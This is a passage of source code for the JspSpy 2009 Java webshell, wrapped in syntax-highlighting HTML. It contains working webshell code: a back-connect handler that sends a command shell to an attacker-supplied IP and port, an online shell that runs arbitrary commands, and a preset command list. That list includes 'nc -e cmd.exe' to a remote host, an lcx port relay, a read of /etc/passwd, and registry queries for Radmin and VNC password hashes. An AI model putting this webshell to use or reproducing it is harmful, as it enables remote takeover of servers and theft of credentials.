class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> port = <span class="built_in">request</span>.getParameter(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip) || Util.<span class="built_in">isEmpty</span>(program) || !Util.isInteger(port))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Socket socket = <span class="keyword">new</span> Socket(ip,Integer.parseInt(port));</span></span><br><span class="line"><span class="vbscript">Process process = Runtime.getRuntime().exec(program);</span></span><br><span class="line"><span class="vbscript">(<span class="keyword">new</span> StreamConnector(process.getInputStream(), socket.getOutputStream())).start();</span></span><br><span class="line"><span class="vbscript">(<span class="keyword">new</span> StreamConnector(socket.getInputStream(), process.getOutputStream())).start();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Back Connect Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"ip"</span>,ip);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"port"</span>,port);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"program"</span>,program);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vbc"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> JspEnvInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td&gt;&lt;h2 id=\"</span>Ninty_H2_Title\<span class="string">"&gt;System Properties &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;div id=\"</span>ghaB\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"            &lt;hr style=\"</span> border: <span class="number">1</span>px solid #ddd;height:<span class="number">0</span>px;\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"            &lt;ul id=\"</span>Ninty_Ul_Sys\<span class="string">" class=\"</span>info\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Properties pro = System.getProperties();</span></span><br><span class="line"><span class="vbscript">Enumeration names = pro.propertyNames();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (names.hasMoreElements())&#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> name = (<span class="built_in">String</span>)names.nextElement();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;li&gt;&lt;u&gt;"</span>+Util.htmlEncode(name)+<span class="string">" : &lt;/u&gt;"</span>+Util.htmlEncode(pro.getProperty(name))+<span class="string">"&lt;/li&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/ul&gt;&lt;h2 id=\"</span>Ninty_H2_Mac\<span class="string">"&gt;System Environment &amp;gt;&amp;gt;&lt;/h2&gt;&lt;hr style=\"</span> border: <span class="number">1</span>px solid #ddd;height:<span class="number">0</span>px;\<span class="string">"/&gt;&lt;ul id=\"</span>Ninty_Ul_Sys\<span class="string">" class=\"</span>info\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Map&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; envs = System.getenv();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span>&lt;Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;&gt; entrySet = envs.entrySet();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; en:entrySet) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;li&gt;&lt;u&gt;"</span>+Util.htmlEncode(en.getKey())+<span class="string">" : &lt;/u&gt;"</span>+Util.htmlEncode(en.getValue())+<span class="string">"&lt;/li&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/ul&gt;&lt;/div&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> TopInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" name=\"</span>doForm\<span class="string">"&gt;&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;tr class=\"</span>head\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&lt;td&gt;&lt;span style=\"</span>float:<span class="built_in">right</span>;\<span class="string">"&gt;&lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;JspSpy Ver: 2009&lt;/a&gt;&lt;/span&gt;"</span>+<span class="built_in">request</span>.getHeader(<span class="string">"host"</span>)+<span class="string">" ("</span>+InetAddress.getLocalHost().getHostAddress()+<span class="string">")&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;tr class=\"</span>alt1\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&lt;td&gt;&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'logout'&#125;);\"&gt;Logout&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'fileList'&#125;);\"&gt;File Manager&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vConn'&#125;);\"&gt;DataBase Manager&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vs'&#125;);\"&gt;Execute Command&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vso'&#125;);\"&gt;Shell OnLine&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vbc'&#125;);\"&gt;Back Connect&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vPortScan'&#125;);;\"&gt;Port Scan&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vd'&#125;);\"&gt;Download Remote File&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:;doPost(&#123;o:<span class="comment">'clipboard'&#125;);\"&gt;ClipBoard&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vRemoteControl'&#125;);\"&gt;Remote Control&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vmp'&#125;);\"&gt;Port Map&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'jspEnv'&#125;);\"&gt;JSP Env&lt;/a&gt; "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (JSession.getAttribute(MSG) != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,JSession.getAttribute(MSG).toString());</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(MSG);</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VOnLineShellInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				function $(id) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					return document.getElementById(id);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				var ie = window.navigator.userAgent.toLowerCase().indexOf(\"</span>msie\<span class="string">") != -1;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				window.onload = function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					setInterval(function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						if ($(\"</span>autoscroll\<span class="string">").checked)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							var f = window.frames[\"</span>echo\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							if (f &amp;&amp; f.document &amp;&amp; f.document.body)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								if (!ie)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									if (f.document.body.offsetHeight)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"										f.scrollTo(0,parseInt(f.document.body.offsetHeight)+1);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#125; else &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									f.scrollTo(0,parseInt(f.document.body.scrollHeight)+1);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&#125;,500);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;h2&gt;Shell OnLine &amp;raquo;&lt;/h2&gt;&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" target=\"</span>echo\<span class="string">" onsubmit=\"</span>$(<span class="comment">'cmd').focus()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;input type=\"</span>submit\<span class="string">" value=\"</span> start \<span class="string">" class=\"</span>bt\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;input type=\"</span>text\<span class="string">" name=\"</span>exe\<span class="string">" style=\"</span>width:<span class="number">300</span>px\<span class="string">" class=\"</span>input\<span class="string">" value=\"</span>c:\\windows\\system32\\cmd.exe\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>online\<span class="string">"/&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>start\<span class="string">"/&gt;&lt;span class=\"</span>tip\<span class="string">"&gt;Notice ! If You Are Using IE , You Must Input A Command First After You Start Or You Will Not See The Echo&lt;/span&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;hr/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;iframe class=\"</span>secho\<span class="string">" name=\"</span>echo\<span class="string">" src=\"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;/iframe&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" onsubmit=\"</span>this.submit();$(<span class="comment">'cmd').value='';return false;\" target=\"asyn\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>text\<span class="string">" id=\"</span>cmd\<span class="string">" name=\"</span>cmd\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">80</span>%\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input name=\"</span>o\<span class="string">" id=\"</span>o\<span class="string">" type=\"</span>hidden\<span class="string">" value=\"</span>online\<span class="string">"/&gt;&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>ddtype\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>ecmd\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;select onchange=\"</span>$(<span class="comment">'cmd').value = this.value;$('cmd').focus()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>\<span class="string">" selected&gt; &lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>uname -a\<span class="string">"&gt;uname -a&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>cat /etc/issue\<span class="string">"&gt;issue&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>cat /etc/passwd\<span class="string">"&gt;passwd&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>netstat -an\<span class="string">"&gt;netstat -an&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net user\<span class="string">"&gt;net user&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>tasklist\<span class="string">"&gt;tasklist&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>tasklist /svc\<span class="string">"&gt;tasklist /svc&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net start\<span class="string">"&gt;net start&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net <span class="keyword">stop</span> policyagent /yes\<span class="string">"&gt;net stop&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>nbtstat -A IP\<span class="string">"&gt;nbtstat -A&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKLM\\System\\CurrentControlSet\\Control\\Terminal <span class="built_in">Server</span>\\WinStations\\RDP-Tcp\<span class="string">" /v \"</span>PortNumber\<span class="string">"'&gt;reg query&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2<span class="number">.0</span>\\<span class="built_in">Server</span>\\Parameters\\\<span class="string">" /v \"</span>Parameter\<span class="string">"'&gt;radmin hash&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4\<span class="string">" /v \"</span>password\<span class="string">"'&gt;vnc hash&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>nc -e cmd.exe <span class="number">192.168</span><span class="number">.230</span><span class="number">.1</span> <span class="number">4444</span>\<span class="string">"&gt;nc&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>lcx -slave <span class="number">192.168</span><span class="number">.230</span><span class="number">.1</span> <span class="number">4444</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span>\<span class="string">"&gt;lcx&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>systeminfo\<span class="string">"&gt;systeminfo&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net localgroup\<span class="string">"&gt;view groups&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net localgroup administrators\<span class="string">"&gt;view admins&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>checkbox\<span class="string">" checked=\"</span>checked\<span class="string">" id=\"</span>autoscroll\<span class="string">"&gt;Auto Scroll"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>button\<span class="string">" value=\"</span><span class="keyword">Stop</span>\<span class="string">" class=\"</span>bt\<span class="string">" onclick=\"</span>$(<span class="comment">'ddtype').value='stop';this.form.submit()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;iframe style=\"</span>display:none\<span class="string">" name=\"</span>asyn\<span class="string">"&gt;&lt;/iframe&gt;"</span></span></span><br><span class="line"><span class="vbscript">);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> type = <span class="built_in">request</span>.getParameter(<span class="string">"type"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(type))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">"start"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> exe = <span class="built_in">request</span>.getParameter(<span class="string">"exe"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(exe))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(exe);</span></span><br><span class="line"><span class="vbscript">ByteArrayOutputStream outs = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentLength(<span class="number">100000000</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentType(<span class="string">"text/html;charset="</span>+Charset.defaultCharset().name());</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = <span class="keyword">new</span> OnLineProcess(pro);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(SHELL_ONLINE,olp);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(<span class="keyword">new</span> ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),<span class="string">"exeOclientR"</span>,olp).start();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(pro.getInputStream(),<span class="built_in">response</span>.getOutputStream(),<span class="string">"exeRclientO"</span>,olp).start();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(pro.getErrorStream(),<span class="built_in">response</span>.getOutputStream(),<span class="string">"exeRclientO"</span>,olp).start();//错误信息流。</span></span><br><span class="line"><span class="vbscript">Thread.sleep(<span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(<span class="string">"ecmd"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">Object o = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cmd = <span class="built_in">request</span>.getParameter(<span class="string">"cmd"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(cmd))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = (OnLineProcess)o;</span></span><br><span class="line"><span class="vbscript">olp.setCmd(cmd);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">Object o = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = (OnLineProcess)o;</span></span><br><span class="line"><span class="vbscript">olp.<span class="keyword">stop</span>();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">static&#123;</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"script"</span>,<span class="keyword">new</span> ScriptInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"before"</span>,<span class="keyword">new</span> BeforeInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"after"</span>,<span class="keyword">new</span> AfterInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"deleteBatch"</span>,<span class="keyword">new</span> DeleteBatchInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"clipboard"</span>,<span class="keyword">new</span> ClipBoardInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vRemoteControl"</span>,<span class="keyword">new</span> VRemoteControlInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"gc"</span>,<span class="keyword">new</span> GcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vPortScan"</span>,<span class="keyword">new</span> VPortScanInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"portScan"</span>,<span class="keyword">new</span> PortScanInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vConn"</span>,<span class="keyword">new</span> VConnInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"dbc"</span>,<span class="keyword">new</span> DbcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"executesql"</span>,<span class="keyword">new</span> ExecuteSQLInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vLogin"</span>,<span class="keyword">new</span> VLoginInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"login"</span>,<span class="keyword">new</span> LoginInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"filelist"</span>, <span class="keyword">new</span> FileListInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"logout"</span>,<span class="keyword">new</span> LogoutInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"upload"</span>,<span class="keyword">new</span> UploadInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"copy"</span>,<span class="keyword">new</span> CopyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"bottom"</span>,<span class="keyword">new</span> BottomInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span 